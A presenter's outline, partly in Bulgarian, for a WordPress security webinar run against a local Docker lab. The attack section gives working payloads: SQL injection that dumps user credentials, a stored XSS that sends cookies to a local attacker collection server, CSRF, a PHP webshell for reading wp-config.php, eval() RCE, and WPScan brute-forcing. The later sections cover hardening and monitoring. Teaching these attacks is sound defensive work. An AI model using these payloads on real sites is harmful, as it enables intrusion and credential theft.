# Presentation Outline — Actually Secure Your WordPress (or Keep Yourself Positive)

> DEV.BG Cyber Security User Group — 20.04.2026, 19:30  
> Speaker: Nedko Hristov, Senior DevOps Engineer @ Nemetschek Bulgaria  
> Format: Online, live demos  
> Duration: ~70 min (including Q&A)

---

## Pre-Flight Checklist

Run these **before** the talk starts (at least 15 minutes early):

```bash
# 1. Start the full stack
cd ~/repo/WordPress-Security-or-keep-yourself-positive-dev-bg-webinar
docker compose up -d --build

# 2. Wait for WordPress to initialize (~30 sec), then run setup
docker compose exec wordpress wp-setup.sh

# 3. Start attacker tools (WPScan + C2 server)
docker compose --profile tools up -d

# 4. Verify everything is running
docker compose --profile tools ps

# 5. Run smoke test
bash demos/attack-playbook.sh --smoke-test
```

### Browser Tabs (pre-open in order)

1. **WP Frontend** — http://localhost:8080
2. **WP Admin** — http://localhost:8080/wp-admin (logged in as admin/admin123)
3. **Vuln Demo page** — http://localhost:8080/wp-admin/admin.php?page=vuln-demo
4. **Attacker C2** — http://localhost:9090
5. **CSRF attack page** — open `demos/csrf-attack.html` as a local file
6. **This outline** — for reference during the talk

### Terminal Windows

- **Terminal 1** — Main demo terminal for `curl` commands (full-screen friendly)
- **Terminal 2** — `docker compose logs -f wordpress` (for showing error_log output)

### Emergency Reset

If something goes wrong mid-demo:

```bash
# Reset WordPress data (nuclear option — recreates everything)
docker compose --profile tools down -v
docker compose up -d --build
sleep 30
docker compose exec wordpress wp-setup.sh
docker compose --profile tools up -d
```

---

## Talk Flow

### INTRO (3 min)

**Slide / talking points:**
- Кратко представяне — DevOps в Nemetschek, homelabbing, security background
- "WordPress powers 43% of the web — and that makes it the #1 target"
- Какво ще покажем днес: реални атаки → как работят → как се защитаваме
- Disclamer: всичко е educational, в изолирана Docker среда

**Transition:** "Нека започнем с това какво вижда един атакуващ, когато стигне до вашия сайт..."

---

### BLOCK 1: SECURITY & REAL ATTACKS (~37 min)

---

#### 1.1 Enumeration & Fingerprinting (5 min)

**Key point:** Преди да атакува, нападателят събира информация. WordPress прави това лесно по подразбиране.

**Demo commands:**

```bash
# Username via author archive redirect
curl -s -I 'http://localhost:8080/?author=1' | grep -i location

# REST API user listing — names, IDs, slugs
curl -s 'http://localhost:8080/wp-json/wp/v2/users' | python3 -m json.tool

# WordPress version in source
curl -s 'http://localhost:8080' | grep 'generator'

# Our debug info endpoint (simulates a bad plugin)
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_debug_info' | python3 -m json.tool

# Login error leaks username existence
curl -s -d 'log=admin&pwd=wrongpassword' 'http://localhost:8080/wp-login.php' | grep -i 'error'
```

**Talking points:**
- REST API `/wp/v2/users` е включен по подразбиране — дава user IDs и имена
- `/?author=N` redirect разкрива username-и
- `readme.html` и `generator` мета тага — fingerprinting на версията
- WP Debug + expose_php → PHP версия в HTTP headers

**Show the fix:** Activate `wp-security-hardened` plugin and re-run the same commands → enumeration blocked.

**Transition:** "Сега знаем username-ите. Какво правим с тях? Следващата стъпка е SQL Injection..."

---

#### 1.2 SQL Injection (5 min)

**Key point:** A03:2021 — Injection. Най-опасната уязвимост. Директно извличане на данни от базата.

**Demo commands:**

```bash
# Normal search — legitimate use
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=Welcome' | python3 -m json.tool

# Boolean test — does it break?
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1%27+OR+%271%27%3D%271' | python3 -m json.tool

# UNION attack — dump credentials
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1%27+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-' | python3 -m json.tool
```

**Talking points:**
- Покажи `query_executed` полето — виж как input-ът отива директно в SQL
- Обясни `wp_unslash()` — WordPress добавя magic quotes, но разработчиците ги махат, и точно това прави атаката възможна
- UNION SELECT е "класика" — позволява да извлечеш данни от произволна таблица
- Password hash-овете могат да бъдат crack-нати offline с hashcat/john

**Show the fix:**

```bash
# Same payload, fixed endpoint — uses $wpdb->prepare()
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search_fixed&q=1%27+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-' | python3 -m json.tool
```

**Transition:** "А какво ако не искаме да крадем данни от базата, а да крадем сесии на потребители?"

---

#### 1.3 XSS + Cookie Theft (5 min)

**Key point:** A03:2021 — Injection (отново). XSS позволява изпълнение на JavaScript в браузъра на жертвата.

**Demo flow:**

1. Show the Guestbook on the Vuln Demo admin page
2. Inject stored XSS:

```bash
# Stored XSS — guestbook entry that steals cookies
curl -s -d 'action=vuln_guestbook_submit&name=Hacker&message=<script>fetch("http://localhost:9090/steal?c="%2Bdocument.cookie)</script>' \
  'http://localhost:8080/wp-admin/admin-ajax.php'
```

3. Visit the Vuln Demo page in the browser as admin → JS executes
4. Show stolen cookies on attacker C2:

```bash
curl -s 'http://localhost:9090/loot' | python3 -m json.tool
```

5. Also show reflected XSS:

```
Open: http://localhost:8080/?vuln_search_page=1&q=<script>alert('XSS')</script>
```

**Talking points:**
- Stored XSS е по-опасна — засяга всеки, който зареди страницата
- `<img onerror>` вариантът bypasses прости filters
- HttpOnly cookie flag блокира `document.cookie` достъпа (покажи в php-hardened.ini)
- CSP header-ите ограничават inline scripts

**Transition:** "XSS изисква жертвата да зареди страницата. А CSRF?"

---

#### 1.4 CSRF (3 min)

**Key point:** A01:2021 — Broken Access Control. Атаката кара браузъра на жертвата да направи заявка от нейно име.

**Demo flow:**

1. Make sure you're logged in as admin in the browser
2. Open `demos/csrf-attack.html` in a new tab
3. Click "Claim Prize" → admin email changed to attacker@evil.com
4. Verify: go to WP Admin → Settings → General → admin email changed

**Talking points:**
- Никакъв JavaScript не е необходим — само HTML form + auto-submit
- WordPress nonces (`wp_nonce_field` / `wp_verify_nonce`) предотвратяват CSRF
- SameSite cookie attribute допълнително защитава

**Transition:** "Следваща е IDOR — когато промяната на един параметър ви дава достъп до чужди данни..."

---

#### 1.5 IDOR (3 min)

**Key point:** A01:2021 — Broken Access Control. Промяна на ID параметъра = достъп до чужди данни.

**Demo commands:**

```bash
# Enumerate all users — no authentication needed
for i in 1 2 3 4 5; do
  echo "--- User $i ---"
  curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_get_user&id=$i" | python3 -m json.tool
done

# Access draft post with secrets (API key in content)
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_get_post&id=2' | python3 -m json.tool
```

**Talking points:**
- Разкрива email-и, роли, registration dates на всички потребители
- Draft постове могат да съдържат чувствителна информация (API keys, вътрешни notes)
- Fix: `current_user_can()` + `get_current_user_id()` проверки

**Transition:** "А сега нещо наистина страшно — качване на файлове без валидация..."

---

#### 1.6 File Upload → Webshell (5 min)

**Key point:** A04:2021 — Insecure Design. Без валидация на файловия тип = PHP webshell на сървъра.

**Demo commands:**

```bash
# Create a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Upload it — no restrictions
curl -s -F 'file=@/tmp/shell.php' 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_upload' | python3 -m json.tool

# Execute OS commands via the uploaded shell
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=id'
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/etc/passwd'
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/var/www/html/wp-config.php'
```

**Talking points:**
- Webshell = пълен контрол. Четене на wp-config.php → DB credentials
- Оригиналното име на файла се запазва — атакуващият знае URL-а
- Fix: extension whitelist + MIME проверка + рандомизирано име
- Infrastructure fix: block PHP execution в uploads (nginx rule, .htaccess)

**Show the fix:**

```bash
# Fixed version rejects .php
curl -s -F 'file=@/tmp/shell.php' 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_upload_fixed' | python3 -m json.tool
```

**Transition:** "Файл upload + webshell е game over. Но ето друг начин за RCE..."

---

#### 1.7 RCE via Calculator (3 min)

**Key point:** A03:2021 — Injection. `eval()` на потребителски вход = произволно изпълнение на PHP код.

**Demo commands:**

```bash
# Normal calculator use
curl -s -d 'action=vuln_calculator&expression=2%2B2' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool

# RCE — execute OS command
curl -s -d 'action=vuln_calculator&expression=system(%27id%27)' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool

# RCE — read wp-config
curl -s -d 'action=vuln_calculator&expression=file_get_contents(%27/var/www/html/wp-config.php%27)' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool

# Fixed version blocks it
curl -s -d 'action=vuln_calculator_fixed&expression=system(%27id%27)' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool
```

**Talking points:**
- `eval()` е "always evil" — никога не го използвайте с потребителски вход
- `disable_functions` в `php-hardened.ini` блокира `system`, `exec`, `passthru` дори ако `eval()` е достъпен
- PHP 8.x: `eval()` не може да се забрани с `disable_functions` (engine level)

**Transition:** "Видяхме ръчни атаки. А какво се случва с nulled теми от интернет?"

---

#### 1.8 Supply Chain — Nulled Theme (5 min)

**Key point:** Supply Chain attacks. Nulled (пиратски) теми и плъгини съдържат backdoor-ове.

**Demo flow:**

1. Open `themes/nulled-theme-demo/functions.php` in editor — walk through the code
2. Show the 3 backdoor types:
   - **Backdoor 1:** Obfuscated `eval()` hidden in "license check" — `?license_verify=` parameter
   - **Backdoor 2:** Hidden admin account creation (`support_admin` user)
   - **Backdoor 3:** Phone-home — exfiltrates site URL + admin email to attacker's server
3. Open `themes/nulled-theme-demo/social-icons.php` — show webshell hidden in template
4. Show common obfuscation techniques:
   - `base64_decode()` wrapping `eval()`
   - Variable variables `$$var`
   - `chr()` to build function names character by character
   - `str_rot13()` encoding
   - `gzinflate(base64_decode())` multi-layer

**Talking points:**
- Nulled теми: спестяваш $50, губиш сайта
- Реални примери: backdoor-ове намерени в топ-теми от warez сайтове
- `grep -rn 'eval\|base64_decode\|system\|exec' themes/` — бърза проверка
- Решение: купувай от легитимни източници, проверявай с Theme Check plugin

**Transition:** "Нека видим как автоматизираните инструменти виждат всичко това..."

---

#### 1.9 WPScan Automated Scanning (3 min)

**Key point:** Автоматизирано сканиране разкрива всичко, което видяхме ръчно — и повече.

**Demo commands:**

```bash
# Full enumeration scan
docker compose --profile tools run --rm wpscan \
  --url http://wordpress \
  --enumerate u,vp,vt \
  --no-banner

# Optional: brute force with password list
docker compose --profile tools run --rm wpscan \
  --url http://wordpress \
  --passwords /tmp/passwords.txt \
  --usernames admin,editor \
  --no-banner
```

**Talking points:**
- WPScan е стандартен инструмент за penetration testing на WordPress
- Намира уязвими плъгини, теми, потребители, WordPress версия
- `--enumerate u,vp,vt` = users, vulnerable plugins, vulnerable themes
- Безплатен с ограничен API, платен за vulnerability database
- Активирай hardening plugin и пусни отново → много по-малко информация

**Transition:** "Видяхте атаките. Сега нека видим как се защитаваме по DevOps начин..."

---

### BLOCK 2: DEVOPS ARCHITECTURE (~8 min)

---

#### 2.1 PHP Configuration — Insecure vs Hardened (3 min)

**Key point:** Конфигурацията на PHP е първата линия на защита.

**Demo flow:**

Open `config/php-demo.ini` and `config/php-hardened.ini` side by side:

| Setting | Insecure | Hardened | Why |
|---------|----------|----------|-----|
| `display_errors` | On | Off | Грешките разкриват файлови пътища и логика |
| `expose_php` | On | Off | Скрива PHP версията от headers |
| `disable_functions` | (none) | exec, system, passthru... | Блокира dangerous PHP functions |
| `open_basedir` | (none) | /var/www/html:/tmp | Ограничава file access |
| `allow_url_include` | On | Off | Предотвратява Remote File Inclusion |
| `session.cookie_httponly` | 0 | 1 | Блокира JavaScript достъп до cookies |

```bash
# Show current PHP config inside container
docker compose exec wordpress php -i | grep -E 'display_errors|expose_php|disable_functions|open_basedir'
```

**Talking points:**
- Тези настройки са тривиални за промяна, но правят огромна разлика
- `disable_functions` щеше да блокира RCE demo-то дори с `eval()`
- `open_basedir` ограничава file_get_contents до /var/www/html и /tmp
- В production: swap `php-demo.ini` с `php-hardened.ini`

---

#### 2.2 Redis Object Caching (2 min)

**Key point:** Application-level caching намалява натоварването на DB и подобрява performance.

**Demo commands:**

```bash
# Redis is already running in our stack
docker compose exec redis redis-cli ping

# Install and activate Redis Object Cache plugin
docker compose exec wordpress wp plugin install redis-cache --activate --allow-root

# Enable object cache
docker compose exec wordpress wp redis enable --allow-root

# Check Redis status
docker compose exec wordpress wp redis status --allow-root

# See cached keys
docker compose exec redis redis-cli DBSIZE
docker compose exec redis redis-cli --scan --pattern '*' | head -20
```

**Talking points:**
- WordPress по подразбиране: всяка заявка = множество SQL queries
- Redis object cache: кешира wp_options, transients, query results в RAM
- Резултат: значително по-бързо зареждане + по-малко DB натоварване
- Ефективно решение при ограничени ресурси (VPS, shared hosting с Redis add-on)

---

#### 2.3 DB Hygiene (3 min)

**Key point:** Редовна хигиена на базата данни = performance + сигурност.

**Demo commands:**

```bash
# Run hygiene audit queries
docker compose exec wordpress wp db query \
  "SELECT option_name, LENGTH(option_value) as size FROM wp_options WHERE autoload='yes' ORDER BY size DESC LIMIT 10;" \
  --allow-root

# Check post revisions
docker compose exec wordpress wp db query \
  "SELECT COUNT(*) as total_revisions FROM wp_posts WHERE post_type = 'revision';" \
  --allow-root

# Check table sizes
docker compose exec wordpress wp db query \
  "SELECT table_name, ROUND(data_length/1024/1024, 2) as data_mb FROM information_schema.tables WHERE table_schema = DATABASE() ORDER BY data_length DESC;" \
  --allow-root
```

**Talking points:**
- Bloated `autoload` options = най-честият performance killer
- Transients с изтекъл срок заемат място безсмислено
- Revisions растат безкрайно по подразбиране → `WP_POST_REVISIONS = 3`
- Orphaned postmeta от деактивирани плъгини
- Пълният набор от queries е в `demos/db-hygiene-queries.sql`

**Transition:** "Приложното ниво е защитено. Сега нека видим инфраструктурата..."

---

### BLOCK 3: INFRASTRUCTURE PREVENTION (~8 min)

---

#### 3.1 Nginx Hardening (5 min)

**Key point:** Edge Security — блокиране на атаки преди да стигнат до WordPress.

**Demo flow:**

Open `config/nginx-hardened.conf` and walk through the key sections:

1. **Rate Limiting** — `wp-login.php`: 3 req/min, XML-RPC: 1 req/min
2. **Block PHP in Uploads** — `location ~* /wp-content/uploads/.*\.php$ { deny all; }` → спира webshell demo-то
3. **Block Sensitive Files** — wp-config.php, .htaccess, .env → 404
4. **Block User Enumeration** — REST API users endpoint + author parameter → 403
5. **Security Headers** — X-Frame-Options, CSP, X-Content-Type-Options
6. **IP-based wp-admin restriction** — (показваме коментирания блок)

**Talking points:**
- Rate limiting е най-ефективната защита срещу brute-force
- Block PHP в uploads — дори ако webshell е качен, не може да се изпълни
- Тези правила отнемат 5 минути, но спират 80% от автоматизираните атаки
- В production: Nginx/Apache пред WordPress (reverse proxy), Cloudflare/WAF отпред

---

#### 3.2 Read-Only Protections & File Permissions (3 min)

**Key point:** Минимизиране на write access = ограничаване на damage от компрометиране.

**Demo commands:**

```bash
# WordPress constants for read-only mode
docker compose exec wordpress wp config set DISALLOW_FILE_EDIT true --raw --allow-root
docker compose exec wordpress wp config set DISALLOW_FILE_MODS true --raw --allow-root

# Show the effect: try editing a plugin from admin → blocked
# Navigate to Plugins → Editor → "Sorry, that is not allowed"

# File permission hardening
docker compose exec wordpress bash -c '
  echo "=== Current permissions ==="
  ls -la /var/www/html/wp-config.php
  ls -la /var/www/html/wp-content/

  echo ""
  echo "=== Recommended permissions ==="
  echo "wp-config.php: 440 (read-only, no world access)"
  echo "wp-content/: 755"
  echo "wp-content/uploads/: 755"
  echo "All .php files: 644"
  echo "Directories: 755"
'
```

**Talking points:**
- `DISALLOW_FILE_EDIT` — спира Plugin/Theme Editor в admin (честа attack vector)
- `DISALLOW_FILE_MODS` — блокира auto-updates и инсталиране на плъгини (deploy-only чрез CI/CD)
- File permissions: wp-config.php трябва да е 440, не 644
- В production с контейнери: mount WordPress filesystem като read-only, само uploads е writable

**Transition:** "Инфраструктурата е заключена. Последната тема — как наблюдаваме и реагираме..."

---

### BLOCK 4: PROTECTION & MONITORING (~6 min)

---

#### 4.1 Integrity Checking (3 min)

**Key point:** Проверка дали core файловете на WordPress са модифицирани.

**Demo commands:**

```bash
# Tamper with a core file (simulate an attack)
docker compose exec wordpress bash -c "echo '<!-- backdoor -->' >> /var/www/html/wp-includes/version.php"

# Detect the modification
docker compose exec wordpress wp core verify-checksums --allow-root

# Fix — re-download clean core files
docker compose exec wordpress wp core download --force --allow-root

# Verify again — all clean
docker compose exec wordpress wp core verify-checksums --allow-root
```

**Talking points:**
- `wp core verify-checksums` сравнява файловете с official checksums от wordpress.org
- Може да се пуска в cron: `0 */6 * * * wp core verify-checksums --allow-root 2>&1 | mail -s "WP Integrity" admin@site.com`
- За plugins/themes: `wp plugin verify-checksums --all`
- Complementary tools: AIDE, OSSEC, Tripwire за OS-level integrity
- Activity log плъгини (WP Activity Log) проследяват кой какво е правил

---

#### 4.2 Activity Logging & Backup Strategy (3 min)

**Key point:** Logging = видимост. Backups = спасение.

**Demo — Activity Logging:**

```bash
# Our hardening plugin logs all login attempts
# Show the logs
docker compose exec wordpress tail -20 /var/www/html/wp-content/debug.log

# Trigger a failed login to see it logged
curl -s -d 'log=admin&pwd=wrongpassword' 'http://localhost:8080/wp-login.php' > /dev/null
docker compose exec wordpress tail -5 /var/www/html/wp-content/debug.log
```

**Talking points — Backup Strategy (slides/talking):**

- **3-2-1 Rule:** 3 copies, 2 different media, 1 off-site
- WordPress backup components:
  - Database: `wp db export backup.sql --allow-root`
  - Files: `wp-content/uploads/` + `wp-config.php`
  - NOT needed: core files (re-downloadable), plugins/themes (from repos or version control)
- Automation:
  - Cron + WP-CLI: `wp db export` + rsync to off-site
  - Plugins: UpdraftPlus (free, S3/Google Drive targets)
  - Infrastructure: filesystem snapshots (LVM, ZFS), DB replication
- Test your backups! A backup you haven't tested is not a backup
- RTO vs RPO — know your numbers

**Transition:** "Нека обобщим..."

---

### CLOSING (8 min)

---

#### Key Takeaways (3 min)

1. **Keep it updated** — WordPress core, plugins, themes → auto-updates where possible
2. **Least privilege** — Don't run as admin unless you need to. Remove unused plugins/themes
3. **Validate everything** — `$wpdb->prepare()`, `esc_html()`, nonces, `current_user_can()`
4. **Harden the stack** — PHP config, Nginx rules, security headers, `disable_functions`
5. **Monitor & respond** — Integrity checks, activity logs, alerting
6. **Backup & test** — 3-2-1 rule, test restores regularly
7. **Never use nulled themes/plugins** — Supply chain attacks are real

#### Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- WordPress Security Handbook: https://developer.wordpress.org/advanced-administration/security/hardening/
- WPScan: https://wpscan.com/
- Patchstack: https://patchstack.com/ (WordPress vulnerability database)
- This repo: (share URL)

#### Q&A (5 min)

Open for questions. Keep Terminal 1 ready for live demo requests.

---

## Timing Summary

| Block | Section | Duration | Cumulative |
|-------|---------|----------|------------|
| Intro | Представяне + agenda | 3 min | 3 min |
| 1 | Enumeration & Fingerprinting | 5 min | 8 min |
| 1 | SQL Injection | 5 min | 13 min |
| 1 | XSS + Cookie Theft | 5 min | 18 min |
| 1 | CSRF | 3 min | 21 min |
| 1 | IDOR | 3 min | 24 min |
| 1 | File Upload → Webshell | 5 min | 29 min |
| 1 | RCE via Calculator | 3 min | 32 min |
| 1 | Supply Chain / Nulled Theme | 5 min | 37 min |
| 1 | WPScan Scanning | 3 min | 40 min |
| 2 | PHP Config Comparison | 3 min | 43 min |
| 2 | Redis Object Caching | 2 min | 45 min |
| 2 | DB Hygiene | 3 min | 48 min |
| 3 | Nginx Hardening | 5 min | 53 min |
| 3 | Read-Only + File Permissions | 3 min | 56 min |
| 4 | Integrity Checking | 3 min | 59 min |
| 4 | Activity Logging + Backups | 3 min | 62 min |
| Close | Key Takeaways | 3 min | 65 min |
| Close | Q&A | 5 min | 70 min |

**Buffer:** If running long, cut or shorten: Redis (2.2), DB Hygiene (2.3), or IDOR (1.5).  
**If running short:** Expand WPScan brute-force demo, show nulled theme obfuscation in more detail, or do live password cracking of extracted hashes.

---

## Demo Reset Commands

Quick reset commands if a specific demo needs to be re-run:

```bash
# Reset guestbook (XSS demo)
docker compose exec wordpress wp db query "TRUNCATE TABLE wp_vuln_guestbook;" --allow-root

# Reset admin email (CSRF demo)
docker compose exec wordpress wp option update admin_email admin@example.com --allow-root

# Delete uploaded webshell (File Upload demo)
docker compose exec wordpress rm -rf /var/www/html/wp-content/uploads/vuln-demo/

# Clear attacker loot (C2 server)
curl -s http://localhost:9090/loot  # just verify, server resets on restart

# Fix tampered core files (Integrity demo)
docker compose exec wordpress wp core download --force --allow-root

# Full WordPress reset
docker compose exec wordpress wp-setup.sh
```
